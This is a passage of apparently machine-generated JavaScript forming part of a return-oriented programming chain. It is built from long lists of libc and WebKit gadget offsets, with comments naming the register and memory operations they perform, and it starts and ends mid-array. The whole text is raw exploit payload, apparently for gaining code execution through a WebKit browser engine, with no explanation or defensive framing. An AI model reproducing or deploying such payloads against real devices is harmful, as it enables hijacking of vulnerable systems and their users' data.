libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1128:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+109512,//L1130
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1130:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+109632,//L1133
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1131:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1133:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+109720,//L1135
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+109736,//L1136
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1135:
db([0,0]);
set_gadget(libc_base+772328,);
//L1136:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+109880,//L1139
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+109848,//L1137
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+109864,//L1138
webkit_base+4687784,
libc_base+165442
]);
//L1137:
db([0,0]);
set_gadget(libc_base+772328,);
//L1138:
db([0,0]);
set_gadget(libc_base+768796,);
//L1139:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+109952,//L1141
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1141:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+110008,//L1143
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1143:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+110104,//L1145
webkit_base+4687784,
libc_base+768796
]);
//L1144:
db([22,0]);// 0x16
set_gadget(webkit_base+3789839,);//pop r11
//L1145:
db([0,0]);
set_gadget(libc_base+772328,);
//L1146:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+110200,//L1147
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+110216,//L1148
webkit_base+4687784,
libc_base+772328
]);
//L1147:
db([0,0]);
set_gadget(libc_base+768796,);
//L1148:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+110304,//L1150
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1150:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+110360,//L1152
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1152:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+110432,//L1154
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1154:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+110488,//L1156
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1156:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1157:
webkit_base+4687784,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+110640,//L1160
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1158:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1160:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+110728,//L1162
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+110744,//L1163
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1162:
db([0,0]);
set_gadget(libc_base+772328,);
//L1163:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+110888,//L1166
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+110856,//L1164
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+110872,//L1165
webkit_base+4687784,
libc_base+165442
]);
//L1164:
db([0,0]);
set_gadget(libc_base+772328,);
//L1165:
db([0,0]);
set_gadget(libc_base+768796,);
//L1166:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+110960,//L1168
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1168:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+111016,//L1170
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1170:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+111112,//L1172
webkit_base+4687784,
libc_base+768796
]);
//L1171:
db([23,0]);// 0x17
set_gadget(webkit_base+3789839,);//pop r11
//L1172:
db([0,0]);
set_gadget(libc_base+772328,);
//L1173:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+111208,//L1174
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+111224,//L1175
webkit_base+4687784,
libc_base+772328
]);
//L1174:
db([0,0]);
set_gadget(libc_base+768796,);
//L1175:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+111312,//L1177
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1177:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+111368,//L1179
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1179:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+111440,//L1181
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1181:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+111496,//L1183
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1183:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1184:
libc_base+165442,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+111648,//L1187
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1185:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1187:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+111736,//L1189
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+111752,//L1190
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1189:
db([0,0]);
set_gadget(libc_base+772328,);
//L1190:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+111896,//L1193
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+111864,//L1191
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+111880,//L1192
webkit_base+4687784,
libc_base+165442
]);
//L1191:
db([0,0]);
set_gadget(libc_base+772328,);
//L1192:
db([0,0]);
set_gadget(libc_base+768796,);
//L1193:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+111968,//L1195
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1195:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+112024,//L1197
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1197:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+112120,//L1199
webkit_base+4687784,
libc_base+768796
]);
//L1198:
db([24,0]);// 0x18
set_gadget(webkit_base+3789839,);//pop r11
//L1199:
db([0,0]);
set_gadget(libc_base+772328,);
//L1200:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+112216,//L1201
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+112232,//L1202
webkit_base+4687784,
libc_base+772328
]);
//L1201:
db([0,0]);
set_gadget(libc_base+768796,);
//L1202:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+112320,//L1204
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1204:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+112376,//L1206
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1206:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+112448,//L1208
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1208:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+112504,//L1210
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1210:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+112608,//L1213
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1211:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L1213:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+112696,//L1215
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+112712,//L1216
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1215:
db([0,0]);
set_gadget(libc_base+772328,);
//L1216:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+112856,//L1219
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+112824,//L1217
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+112840,//L1218
webkit_base+4687784,
libc_base+165442
]);
//L1217:
db([0,0]);
set_gadget(libc_base+772328,);
//L1218:
db([0,0]);
set_gadget(libc_base+768796,);
//L1219:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+112928,//L1221
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1221:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+112984,//L1223
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1223:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+113080,//L1225
webkit_base+4687784,
libc_base+768796
]);
//L1224:
db([2,0]);// 0x2
set_gadget(webkit_base+3789839,);//pop r11
//L1225:
db([0,0]);
set_gadget(libc_base+772328,);
//L1226:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+113176,//L1227
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+113192,//L1228
webkit_base+4687784,
libc_base+772328
]);
//L1227:
db([0,0]);
set_gadget(libc_base+768796,);
//L1228:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+113280,//L1230
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1230:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+113336,//L1232
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1232:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+113456,//L1235
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1233:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1235:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+113544,//L1237
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+113560,//L1238
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1237:
db([0,0]);
set_gadget(libc_base+772328,);
//L1238:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+113704,//L1241
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+113672,//L1239
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+113688,//L1240
webkit_base+4687784,
libc_base+165442
]);
//L1239:
db([0,0]);
set_gadget(libc_base+772328,);
//L1240:
db([0,0]);
set_gadget(libc_base+768796,);
//L1241:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+113776,//L1243
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1243:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+113832,//L1245
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1245:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+113928,//L1247
webkit_base+4687784,
libc_base+768796
]);
//L1246:
db([25,0]);// 0x19
set_gadget(webkit_base+3789839,);//pop r11
//L1247:
db([0,0]);
set_gadget(libc_base+772328,);
//L1248:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+114024,//L1249
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+114040,//L1250
webkit_base+4687784,
libc_base+772328
]);
//L1249:
db([0,0]);
set_gadget(libc_base+768796,);
//L1250:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+114128,//L1252
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1252:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+114184,//L1254
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1254:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+114256,//L1256
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1256:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+114312,//L1258
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1258:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1259:
libc_base+765023,//mov [rdi],r8
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+114464,//L1262
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1260:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1262:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+114552,//L1264
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+114568,//L1265
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1264:
db([0,0]);
set_gadget(libc_base+772328,);
//L1265:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+114712,//L1268
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+114680,//L1266
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+114696,//L1267
webkit_base+4687784,
libc_base+165442
]);
//L1266:
db([0,0]);
set_gadget(libc_base+772328,);
//L1267:
db([0,0]);
set_gadget(libc_base+768796,);
//L1268:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+114784,//L1270
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1270:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+114840,//L1272
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1272:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+114936,//L1274
webkit_base+4687784,
libc_base+768796
]);
//L1273:
db([26,0]);// 0x1a
set_gadget(webkit_base+3789839,);//pop r11
//L1274:
db([0,0]);
set_gadget(libc_base+772328,);
//L1275:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+115032,//L1276
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+115048,//L1277
webkit_base+4687784,
libc_base+772328
]);
//L1276:
db([0,0]);
set_gadget(libc_base+768796,);
//L1277:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+115136,//L1279
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1279:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+115192,//L1281
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1281:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+115264,//L1283
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1283:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+115320,//L1285
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1285:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L1286:
libc_base+165442,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+115472,//L1289
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1287:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1289:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+115560,//L1291
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+115576,//L1292
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1291:
db([0,0]);
set_gadget(libc_base+772328,);
//L1292:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+115720,//L1295
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+115688,//L1293
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+115704,//L1294
webkit_base+4687784,
libc_base+165442
]);
//L1293:
db([0,0]);
set_gadget(libc_base+772328,);
//L1294:
db([0,0]);
set_gadget(libc_base+768796,);
//L1295:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+115792,//L1297
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1297:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+115848,//L1299
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1299:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+115944,//L1301
webkit_base+4687784,
libc_base+768796
]);
//L1300:
db([27,0]);// 0x1b
set_gadget(webkit_base+3789839,);//pop r11
//L1301:
db([0,0]);
set_gadget(libc_base+772328,);
//L1302:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+116040,//L1303
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+116056,//L1304
webkit_base+4687784,
libc_base+772328
]);
//L1303:
db([0,0]);
set_gadget(libc_base+768796,);
//L1304:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+116144,//L1306
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1306:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+116200,//L1308
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1308:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+116272,//L1310
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1310:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+116328,//L1312
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1312:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+116432,//L1315
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1313:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L1315:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+116520,//L1317
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+116536,//L1318
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1317:
db([0,0]);
set_gadget(libc_base+772328,);
//L1318:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+116680,//L1321
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+116648,//L1319
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+116664,//L1320
webkit_base+4687784,
libc_base+165442
]);
//L1319:
db([0,0]);
set_gadget(libc_base+772328,);
//L1320:
db([0,0]);
set_gadget(libc_base+768796,);
//L1321:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+116752,//L1323
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1323:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+116808,//L1325
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1325:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+116904,//L1327
webkit_base+4687784,
libc_base+768796
]);
//L1326:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L1327:
db([0,0]);
set_gadget(libc_base+772328,);
//L1328:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+117000,//L1329
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+117016,//L1330
webkit_base+4687784,
libc_base+772328
]);
//L1329:
db([0,0]);
set_gadget(libc_base+768796,);
//L1330:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+117104,//L1332
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1332:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+117160,//L1334
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1334:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+117280,//L1337
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L1335:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L1337:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+117368,//L1339
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+117384,//L1340
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1339:
db([0,0]);
set_gadget(libc_base+772328,);
//L1340:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+117528,//L1343
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+117496,//L1341
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+117512,//L1342
webkit_base+4687784,
libc_base+165442
]);
//L1341:
db([0,0]);
set_gadget(libc_base+772328,);
//L1342:
db([0,0]);
set_gadget(libc_base+768796,);
//L1343:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+117600,//L1345
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1345:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+117656,//L1347
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L1347:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+117752,//L1349
webkit_base+4687784,
libc_base+768796
]);
//L1348:
db([28,0]);// 0x1c
set_gadget(webkit_base+3789839,);//pop r11
//L1349:
db([0,0]);
set_gadget(libc_base+772328,);
//L1350:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+117848,//L1351
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+117864,//L1352
webkit_base+4687784,
